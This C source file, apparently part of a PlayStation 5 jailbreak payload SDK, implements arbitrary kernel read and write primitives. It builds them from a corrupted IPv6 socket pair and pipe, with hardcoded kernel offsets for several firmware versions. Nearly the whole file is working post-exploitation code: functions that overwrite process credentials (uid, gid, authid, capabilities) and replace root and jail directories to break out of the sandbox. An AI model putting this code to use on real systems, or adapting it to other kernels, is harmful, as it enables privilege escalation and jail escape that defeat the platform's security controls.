/* Copyright (C) 2023 John Törnblom

This program is free software; you can redistribute it and/or modify it
under the terms of the GNU General Public License as published by the
Free Software Foundation; either version 3, or (at your option) any
later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; see the file COPYING. If not, see
<http://www.gnu.org/licenses/>.  */

#include "payload.h"


/**
 * standard macros.
 **/
#define IPPROTO_IPV6 41
#define IPV6_PKTINFO 46


/**
 * dynamic library loaded in kernel memory.
 **/
typedef struct dynlib_dynsec {
  struct {
    unsigned long le_next;
    unsigned long le_prev;
  } list_entry;

  unsigned long sysvec;
  unsigned int refcount;
  unsigned long size;

  unsigned long symtab;
  unsigned long symtabsize;

  unsigned long strtab;
  unsigned long strtabsize;

  unsigned long pltrela;
  unsigned long pltrelasize;

  unsigned long rela;
  unsigned long relasize;

  unsigned long hash;
  unsigned long hashsize;

  unsigned long dynamic;
  unsigned long dynamicsize;

  unsigned long sce_comment;
  unsigned long sce_commentsize;

  unsigned long sce_dynlib;
  unsigned long sce_dynlibsize;

  unsigned long unknown1;     // execpath?
  unsigned long unknown1size;

  unsigned long buckets;
  unsigned long bucketssize;
  unsigned int nbuckets;

  unsigned long chains;
  unsigned long chainssize;
  unsigned int nchains;

  unsigned long unknown2[7];
} dynlib_dynsec_t;


/**
 * an ELF loaded in kernel memory.
 **/
typedef struct dynlib_obj {
  unsigned long next;
  unsigned long path;
  unsigned long unknown0[2];
  unsigned int refcount;
  unsigned long handle;

  unsigned long mapbase;
  unsigned long mapsize;
  unsigned long textsize;

  unsigned long database;
  unsigned long datasize;

  unsigned long unknown1;
  unsigned long unknown1size;

  unsigned long vaddrbase;
  unsigned long relocbase;
  unsigned long entry;

  unsigned int tlsindex;
  unsigned long tlsinit;
  unsigned long tlsinitsize;
  unsigned long tlssize;
  unsigned long  tlsoffset;
  unsigned long tlsalign;

  unsigned long pltgot;

  unsigned long unknown2[6];

  unsigned long init;
  unsigned long fini;

  unsigned long eh_frame_hdr;
  unsigned long eh_frame_hdr_size;

  unsigned long eh_frame;
  unsigned long eh_frame_size;

  int status;
  int flags;

  unsigned long unknown5[5];
  unsigned long dynsec;
  unsigned long unknown6[6]; //fingerprint?
} dynlib_obj_t;


/**
 * an ELF symbol loaded in kernel memory.
 **/
typedef struct {
  unsigned int st_name;
  unsigned char st_info;
  unsigned char st_other;
  unsigned short st_shndx;
  unsigned long st_value;
  unsigned long st_size;
} Elf64_Sym;


/**
 * libkernel and libc symbols
 **/
static long (*_read)(int, void*, unsigned long);
static long (*_write)(int, const void*, unsigned long);
static int (*_getsockopt)(int, int, int, void *, unsigned int *);
static int (*_setsockopt)(int, int, int, const void*, unsigned int);
static int (*sysctlbyname)(const char *, void *, unsigned long*,
			   const void *, unsigned long);
static void* (*malloc)(unsigned long);
static void  (*free)(void*);
static int   (*strncmp)(const char*, const char*, unsigned long);


/**
 * public constants.
 **/
unsigned long KERNEL_ADDRESS_DATA_BASE      = 0;
unsigned long KERNEL_ADDRESS_ALLPROC        = 0;
unsigned long KERNEL_ADDRESS_PRISON0        = 0;
unsigned long KERNEL_ADDRESS_ROOTVNODE      = 0;
unsigned long KERNEL_ADDRESS_SECURITY_FLAGS = 0;
unsigned long KERNEL_ADDRESS_UTOKEN_FLAGS   = 0;
unsigned long KERNEL_ADDRESS_QA_FLAGS       = 0;
unsigned long KERNEL_ADDRESS_TARGETID       = 0;

const unsigned long KERNEL_OFFSET_PROC_P_UCRED = 0x40;
const unsigned long KERNEL_OFFSET_PROC_P_FD    = 0x48;
const unsigned long KERNEL_OFFSET_PROC_P_PID   = 0xBC;

const unsigned long KERNEL_OFFSET_UCRED_CR_UID   = 0x04;
const unsigned long KERNEL_OFFSET_UCRED_CR_RUID  = 0x08;
const unsigned long KERNEL_OFFSET_UCRED_CR_SVUID = 0x0C;
const unsigned long KERNEL_OFFSET_UCRED_CR_RGID  = 0x14;
const unsigned long KERNEL_OFFSET_UCRED_CR_SVGID = 0x18;

const unsigned long KERNEL_OFFSET_UCRED_CR_SCEAUTHID = 0x58;
const unsigned long KERNEL_OFFSET_UCRED_CR_SCECAPS   = 0x60;
const unsigned long KERNEL_OFFSET_UCRED_CR_SCEATTRS  = 0x83;

const unsigned long KERNEL_OFFSET_FILEDESC_FD_RDIR = 0x10;
const unsigned long KERNEL_OFFSET_FILEDESC_FD_JDIR = 0x18;


/**
 * private global variables.
 **/
static int master_sock = -1;
static int victim_sock = -1;
static int rw_pipe[2] = {-1, -1};
static unsigned long pipe_addr = 0;
static unsigned long kdata_base = 0;



/**
 *
 **/
unsigned int
kernel_get_fw_version(void) {
  unsigned int version = 0;
  unsigned long size = sizeof(version);

  if(sysctlbyname("kern.sdk_version", &version, &size, 0, 0)) {
    return 0;
  }

  return version;
}


__attribute__((constructor(101))) static void
kernel_constructor(const payload_args_t *args) {
  int error = 0;

  if((error=args->sceKernelDlsym(0x2001, "_read", &_read))) {
    *args->payloadout = error;
    return;
  }

  if((error=args->sceKernelDlsym(0x2001, "_write", &_write))) {
    *args->payloadout = error;
    return;
  }

  if((error=args->sceKernelDlsym(0x2001, "_setsockopt", &_setsockopt))) {
    *args->payloadout = error;
    return;
  }

  if((error=args->sceKernelDlsym(0x2001, "_getsockopt", &_getsockopt))) {
    *args->payloadout = error;
    return;
  }

  if((error=args->sceKernelDlsym(0x2001, "sysctlbyname", &sysctlbyname))) {
    *args->payloadout = error;
    return;
  }

  if((error=args->sceKernelDlsym(0x2, "malloc", &malloc))) {
    *args->payloadout = error;
    return;
  }

  if((error=args->sceKernelDlsym(0x2, "free", &free))) {
    *args->payloadout = error;
    return;
  }

  if((error=args->sceKernelDlsym(0x2, "strncmp", &strncmp))) {
    *args->payloadout = error;
    return;
  }

  if((master_sock=args->rwpair[0]) < 0) {
    *args->payloadout = -1;
    return;
  }

  if((victim_sock=args->rwpair[1]) < 0) {
    *args->payloadout = -1;
    return;
  }

  if((rw_pipe[0]=args->rwpipe[0]) < 0) {
    *args->payloadout = -1;
    return;
  }

  if((rw_pipe[1]=args->rwpipe[1]) < 0) {
    *args->payloadout = -1;
    return;
  }

  if(!(pipe_addr=args->kpipe_addr)) {
    *args->payloadout = -1;
    return;
  }

  if(!(KERNEL_ADDRESS_DATA_BASE=args->kdata_base_addr)) {
    *args->payloadout = -1;
    return;
  }

  switch(kernel_get_fw_version() & 0xffff0000) {
  case 0x3000000:
  case 0x3100000:
  case 0x3200000:
  case 0x3210000:
    KERNEL_ADDRESS_ALLPROC        = KERNEL_ADDRESS_DATA_BASE + 0x276DC58;
    KERNEL_ADDRESS_SECURITY_FLAGS = KERNEL_ADDRESS_DATA_BASE + 0x6466474;
    KERNEL_ADDRESS_TARGETID       = KERNEL_ADDRESS_DATA_BASE + 0x646647D;
    KERNEL_ADDRESS_QA_FLAGS       = KERNEL_ADDRESS_DATA_BASE + 0x6466498;
    KERNEL_ADDRESS_UTOKEN_FLAGS   = KERNEL_ADDRESS_DATA_BASE + 0x6466500;
    KERNEL_ADDRESS_PRISON0        = KERNEL_ADDRESS_DATA_BASE + 0x1CC2670;
    KERNEL_ADDRESS_ROOTVNODE      = KERNEL_ADDRESS_DATA_BASE + 0x67AB4C0;
    break;

  case 0x4020000:
    KERNEL_ADDRESS_ALLPROC        = KERNEL_ADDRESS_DATA_BASE + 0x27EDCB8;
    KERNEL_ADDRESS_SECURITY_FLAGS = KERNEL_ADDRESS_DATA_BASE + 0x6505474;
    KERNEL_ADDRESS_TARGETID       = KERNEL_ADDRESS_DATA_BASE + 0x650547D;
    KERNEL_ADDRESS_QA_FLAGS       = KERNEL_ADDRESS_DATA_BASE + 0x6505498;
    KERNEL_ADDRESS_UTOKEN_FLAGS   = KERNEL_ADDRESS_DATA_BASE + 0x6505500;
    KERNEL_ADDRESS_PRISON0        = KERNEL_ADDRESS_DATA_BASE + 0x1D34D00;
    KERNEL_ADDRESS_ROOTVNODE      = KERNEL_ADDRESS_DATA_BASE + 0x66E64C0;
    break;

  case 0x4000000:
  case 0x4030000:
  case 0x4500000:
  case 0x4510000:
    KERNEL_ADDRESS_ALLPROC        = KERNEL_ADDRESS_DATA_BASE + 0x27EDCB8;
    KERNEL_ADDRESS_SECURITY_FLAGS = KERNEL_ADDRESS_DATA_BASE + 0x6506474;
    KERNEL_ADDRESS_TARGETID       = KERNEL_ADDRESS_DATA_BASE + 0x650647D;
    KERNEL_ADDRESS_QA_FLAGS       = KERNEL_ADDRESS_DATA_BASE + 0x6506498;
    KERNEL_ADDRESS_UTOKEN_FLAGS   = KERNEL_ADDRESS_DATA_BASE + 0x6506500;
    KERNEL_ADDRESS_PRISON0        = KERNEL_ADDRESS_DATA_BASE + 0x1D34D00;
    KERNEL_ADDRESS_ROOTVNODE      = KERNEL_ADDRESS_DATA_BASE + 0x66E74C0;
    break;

  default:
    *args->payloadout = -1;
    return;
  }
}


/**
 *
 **/
static int
kernel_write(unsigned long addr, unsigned long *data) {
  unsigned long victim_buf[3];

  // sanity check for invalid kernel pointers
  if(!(addr & 0xffff000000000000)) {
    return -1;
  }

  victim_buf[0] = addr;
  victim_buf[1] = 0;
  victim_buf[2] = 0;

  if(_setsockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, victim_buf, 0x14)) {
    return -1;
  }

  if(_setsockopt(victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, data, 0x14)) {
    return -1;
  }

  return 0;
}


/**
 *
 **/
int
kernel_copyin(const void *udaddr, unsigned long kaddr, unsigned long len) {
  unsigned long write_buf[3];

  // Set pipe flags
  write_buf[0] = 0;
  write_buf[1] = 0x4000000000000000;
  write_buf[2] = 0;
  if(kernel_write(pipe_addr, (unsigned long *) &write_buf)) {
    return -1;
  }

  // Set pipe data addr
  write_buf[0] = kaddr;
  write_buf[1] = 0;
  write_buf[2] = 0;
  if(kernel_write(pipe_addr + 0x10, (unsigned long *) &write_buf)) {
    return -1;
  }

  // Perform write across pipe
  if(_write(rw_pipe[1], udaddr, len) < 0) {
    return -1;
  }

  return 0;
}


/**
 *
 **/
int
kernel_copyout(unsigned long kaddr, void *udaddr, unsigned long len) {
  unsigned long write_buf[3];

  // Set pipe flags
  write_buf[0] = 0x4000000040000000;
  write_buf[1] = 0x4000000000000000;
  write_buf[2] = 0;
  if(kernel_write(pipe_addr, (unsigned long *) &write_buf)) {
    return -1;
  }

  // Set pipe data addr
  write_buf[0] = kaddr;
  write_buf[1] = 0;
  write_buf[2] = 0;
  if(kernel_write(pipe_addr + 0x10, (unsigned long *) &write_buf)) {
    return -1;
  }

  // Perform read across pipe
  if(_read(rw_pipe[0], udaddr, len) < 0) {
    return -1;
  }

  return 0;
}


/**
 *
 **/
int
kernel_get_qaflags(unsigned char qaflags[16]) {
  return kernel_copyout(KERNEL_ADDRESS_QA_FLAGS, qaflags, 16);
}


/**
 *
 **/
int
kernel_set_qaflags(unsigned char qaflags[16]) {
  return kernel_copyin(qaflags, KERNEL_ADDRESS_QA_FLAGS, 16);
}


/**
 *
 **/
unsigned long
kernel_get_root_vnode(void) {
  unsigned long vnode = 0;

  if(kernel_copyout(KERNEL_ADDRESS_ROOTVNODE, &vnode, sizeof(vnode))) {
    return 0;
  }

  return vnode;
}

/**
 *
 **/
unsigned long
kernel_get_proc(unsigned int pid) {
  unsigned int other_pid = 0;
  unsigned long addr = 0;
  unsigned long next = 0;

  if(kernel_copyout(KERNEL_ADDRESS_ALLPROC, &addr, sizeof(addr))) {
    return 0;
  }

  while(addr) {
    if(kernel_copyout(addr + KERNEL_OFFSET_PROC_P_PID, &other_pid,
		      sizeof(other_pid))) {
      return 0;
    }

    if(pid == other_pid) {
      break;
    }

    if(kernel_copyout(addr, &next, sizeof(next))) {
      return 0;
    }

    addr = next;
  }

  return addr;
}


unsigned long
kernel_dynlib_resolve(unsigned int pid, unsigned int handle, const char *nid) {
  unsigned long kproc = kernel_get_proc(pid);
  dynlib_dynsec_t dynsec;
  unsigned long kaddr;
  unsigned long vaddr;
  Elf64_Sym *symtab;
  dynlib_obj_t obj;
  char *strtab;

  if(!(kproc=kernel_get_proc(pid))) {
    return 0;
  }

  if(kernel_copyout(kproc + 0x3e8, &kaddr, sizeof(kaddr)) < 0) {
    return 0;
  }

  do {
    if(kernel_copyout(kaddr, &kaddr, sizeof(kaddr)) < 0) {
      return 0;
    }
    if(!kaddr) {
      return 0;
    }

    if(kernel_copyout(kaddr + __builtin_offsetof(dynlib_obj_t, handle),
		      &obj.handle, sizeof(obj.handle)) < 0) {
      return 0;
    }
  } while(obj.handle != handle);

  if(kernel_copyout(kaddr, &obj, sizeof(obj)) < 0) {
    return 0;
  }

  if(kernel_copyout(obj.dynsec, &dynsec, sizeof(dynsec)) < 0) {
    return 0;
  }

  if(!(symtab=malloc(dynsec.symtabsize))) {
    return 0;
  }

  if(kernel_copyout(dynsec.symtab, symtab, dynsec.symtabsize) < 0) {
    free(symtab);
    return 0;
  }

  if(!(strtab=malloc(dynsec.strtabsize))) {
    free(symtab);
    return 0;
  }

  if(kernel_copyout(dynsec.strtab, strtab, dynsec.strtabsize) < 0) {
    free(symtab);
    free(strtab);
    return 0;
  }

  vaddr = 0;
  for(unsigned long i=0; i<dynsec.symtabsize / sizeof(Elf64_Sym); i++) {
    if(!strncmp(nid, strtab + symtab[i].st_name, 11)) {
      vaddr = obj.mapbase + symtab[i].st_value;
      break;
    }
  }

  free(symtab);
  free(strtab);

  return vaddr;
}


/**
 *
 **/
unsigned long
kernel_get_proc_ucred(unsigned int pid) {
  unsigned long proc = 0;
  unsigned long ucred = 0;

  if(!(proc=kernel_get_proc(pid))) {
    return 0;
  }

  if(kernel_copyout(proc + KERNEL_OFFSET_PROC_P_UCRED, &ucred,
		    sizeof(ucred))) {
    return 0;
  }

  return ucred;
}


/**
 *
 **/
unsigned long
kernel_get_ucred_authid(unsigned int pid) {
  unsigned long authid = 0;
  unsigned long ucred = 0;

  if(!(ucred=kernel_get_proc_ucred(pid))) {
    return 0;
  }

  if(kernel_copyout(ucred + KERNEL_OFFSET_UCRED_CR_SCEAUTHID, &authid,
		    sizeof(authid))) {
    return 0;
  }

  return authid;
}


/**
 *
 **/
int
kernel_set_ucred_authid(unsigned int pid, unsigned long authid) {
  unsigned long ucred = 0;

  if(!(ucred=kernel_get_proc_ucred(pid))) {
    return -1;
  }

  if(kernel_copyin(&authid, ucred + KERNEL_OFFSET_UCRED_CR_SCEAUTHID,
		   sizeof(authid))) {
    return -1;
  }

  return 0;
}


/**
 *
 **/
int
kernel_get_ucred_caps(unsigned int pid, unsigned char caps[16]) {
  unsigned long ucred = 0;

  if(!(ucred=kernel_get_proc_ucred(pid))) {
    return -1;
  }

  if(kernel_copyout(ucred + KERNEL_OFFSET_UCRED_CR_SCECAPS, caps, 16)) {
    return -1;
  }

  return 0;
}


/**
 *
 **/
int
kernel_set_ucred_caps(unsigned int pid, unsigned char caps[16]) {
  unsigned long ucred = 0;

  if(!(ucred=kernel_get_proc_ucred(pid))) {
    return -1;
  }

  if(kernel_copyin(caps, ucred + KERNEL_OFFSET_UCRED_CR_SCECAPS, 16)) {
    return -1;
  }

  return 0;
}


/**
 *
 **/
unsigned long
kernel_get_ucred_attrs(unsigned int pid) {
  unsigned long ucred = 0;
  unsigned long attrs = 0;

  if(!(ucred=kernel_get_proc_ucred(pid))) {
    return 0;
  }

  if(kernel_copyout(ucred + KERNEL_OFFSET_UCRED_CR_SCEATTRS, &attrs,
		    sizeof(attrs))) {
    return 0;
  }

  return attrs;
}


/**
 *
 **/
int
kernel_set_ucred_attrs(unsigned int pid, unsigned long attrs) {
  unsigned long ucred = 0;

  if(!(ucred=kernel_get_proc_ucred(pid))) {
    return -1;
  }

  if(kernel_copyin(&attrs, ucred + KERNEL_OFFSET_UCRED_CR_SCEATTRS,
		   sizeof(attrs))) {
    return -1;
  }

  return 0;
}


/**
 *
 **/
int
kernel_set_ucred_uid(unsigned int pid, unsigned int uid) {
  unsigned long ucred = 0;

  if(!(ucred=kernel_get_proc_ucred(pid))) {
    return -1;
  }

  if(kernel_copyin(&uid, ucred + KERNEL_OFFSET_UCRED_CR_UID,
		   sizeof(uid))) {
    return -1;
  }

  return 0;
}


/**
 *
 **/
int
kernel_set_ucred_ruid(unsigned int pid, unsigned int ruid) {
  unsigned long ucred = 0;

  if(!(ucred=kernel_get_proc_ucred(pid))) {
    return -1;
  }

  if(kernel_copyin(&ruid, ucred + KERNEL_OFFSET_UCRED_CR_RUID,
		   sizeof(ruid))) {
    return -1;
  }

  return 0;
}


/**
 *
 **/
int
kernel_set_ucred_svuid(unsigned int pid, unsigned int svuid) {
  unsigned long ucred = 0;

  if(!(ucred=kernel_get_proc_ucred(pid))) {
    return -1;
  }

  if(kernel_copyin(&svuid, ucred + KERNEL_OFFSET_UCRED_CR_SVUID,
		   sizeof(svuid))) {
    return -1;
  }

  return 0;
}



/**
 *
 **/
int
kernel_set_ucred_rgid(unsigned int pid, unsigned int rgid) {
  unsigned long ucred = 0;

  if(!(ucred=kernel_get_proc_ucred(pid))) {
    return -1;
  }

  if(kernel_copyin(&rgid, ucred + KERNEL_OFFSET_UCRED_CR_RGID,
		   sizeof(rgid))) {
    return -1;
  }

  return 0;
}


/**
 *
 **/
int
kernel_set_ucred_svgid(unsigned int pid, unsigned int svgid) {
  unsigned long ucred = 0;

  if(!(ucred=kernel_get_proc_ucred(pid))) {
    return -1;
  }

  if(kernel_copyin(&svgid, ucred + KERNEL_OFFSET_UCRED_CR_SVGID,
		   sizeof(svgid))) {
    return -1;
  }

  return 0;
}


/**
 *
 **/
unsigned long
kernel_get_proc_filedesc(unsigned int pid) {
  unsigned long filedesc = 0;
  unsigned long proc = 0;

  if(!(proc=kernel_get_proc(pid))) {
    return 0;
  }

  if(kernel_copyout(proc + KERNEL_OFFSET_PROC_P_FD, &filedesc,
		    sizeof(filedesc))) {
    return 0;
  }

  return filedesc;
}


/**
 *
 **/
unsigned long
kernel_get_proc_rootdir(unsigned int pid) {
  unsigned long filedesc = 0;
  unsigned long vnode = 0;

  if(!(filedesc=kernel_get_proc_filedesc(pid))) {
    return 0;
  }

  if(kernel_copyout(filedesc + KERNEL_OFFSET_FILEDESC_FD_RDIR, &vnode,
		    sizeof(vnode))) {
    return 0;
  }

  return vnode;
}


/**
 *
 **/
unsigned long
kernel_get_proc_jaildir(unsigned int pid) {
  unsigned long filedesc = 0;
  unsigned long vnode = 0;

  if(!(filedesc=kernel_get_proc_filedesc(pid))) {
    return 0;
  }

  if(kernel_copyout(filedesc + KERNEL_OFFSET_FILEDESC_FD_JDIR, &vnode,
		    sizeof(vnode))) {
    return 0;
  }

  return vnode;
}


/**
 *
 **/
int
kernel_set_proc_rootdir(unsigned int pid, unsigned long vnode) {
  unsigned long filedesc = 0;

  if(!(filedesc=kernel_get_proc_filedesc(pid))) {
    return 0;
  }

  if(kernel_copyin(&vnode, filedesc + KERNEL_OFFSET_FILEDESC_FD_RDIR,
		   sizeof(vnode))) {
    return -1;
  }

  return 0;
}


/**
 *
 **/
int
kernel_set_proc_jaildir(unsigned int pid, unsigned long vnode) {
  unsigned long filedesc = 0;

  if(!(filedesc=kernel_get_proc_filedesc(pid))) {
    return 0;
  }

  if(kernel_copyin(&vnode, filedesc + KERNEL_OFFSET_FILEDESC_FD_JDIR,
		   sizeof(vnode))) {
    return -1;
  }

  return 0;
}
